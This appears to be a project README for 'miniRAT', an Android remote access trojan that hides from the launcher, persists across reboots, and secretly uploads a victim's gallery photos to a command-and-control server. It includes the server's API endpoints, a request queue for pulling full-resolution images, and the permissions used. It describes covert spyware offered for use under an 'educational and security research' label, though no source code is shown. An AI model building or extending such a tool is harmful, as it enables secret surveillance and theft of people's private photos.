# miniRAT

> Minimal Android RAT for educational and security research. Covert gallery exfiltration with on-demand full-image retrieval.

---

## Overview

| Component | Technology | Description |
|---|---|---|
| **Android Client** | Java, Android SDK 21–36 | Stealth app: periodic gallery scan, thumbnail upload, full-image on-demand |
| **C2 Server** | Node.js, Express.js | Thumbnail receiver, full-image request queue, live gallery dashboard |

---

## Features

### Android Client
- **Modular architecture** — 5 classes with single responsibilities
- **Periodic scan** — Every 15 min with server reachability check
- **Deduplication** — SharedPreferences tracks uploaded MediaStore IDs
- **Thumbnail upload** — 128×128 JPEG at 70% quality (~10 KB each)
- **Full-image on-demand** — Polls server for requests, uploads full-res
- **Zero UI** — Auto-hides from launcher after first run
- **WakeLock** — CPU active during scan, released after
- **Boot persistence** — BootReceiver + START_STICKY

### C2 Server
- **Request queue** — Dashboard click → phone uploads full-res on next scan
- **Live dashboard** — Dark theme, 3s refresh, request/download buttons
- **Path traversal protection** — `path.basename()` sanitization
- **50MB JSON limit** — Handles full-resolution image uploads

---

## API Reference

| Method | Endpoint | Description |
|---|---|---|
| `HEAD` | `/api/thumbnails` | Reachability check (phone) |
| `POST` | `/api/upload/thumbnail` | Upload `{ filename, thumbnail }` |
| `POST` | `/api/upload/fullsize` | Upload `{ filename, image }` |
| `GET` | `/api/thumbnails` | List all (with status flags) |
| `GET` | `/api/fullsize/:file` | Download full-size image |
| `GET` | `/api/requests` | List pending full-image requests |
| `POST` | `/api/request/:file` | Queue request (dashboard) |
| `DELETE` | `/api/request/:file` | Mark fulfilled (phone) |

---

## Permissions

| Permission | API Range | Usage |
|---|---|---|
| `INTERNET` | All | Upload to C2 |
| `WAKE_LOCK` | All | CPU during scan |
| `ACCESS_NETWORK_STATE` | All | Connectivity |
| `READ_EXTERNAL_STORAGE` | 21–32 | Gallery access |
| `READ_MEDIA_IMAGES` | 33+ | Gallery access |
| `RECEIVE_BOOT_COMPLETED` | All | Boot persistence |
| `FOREGROUND_SERVICE` | 26+ | Foreground service |
| `FOREGROUND_SERVICE_DATA_SYNC` | 34+ | Service type |
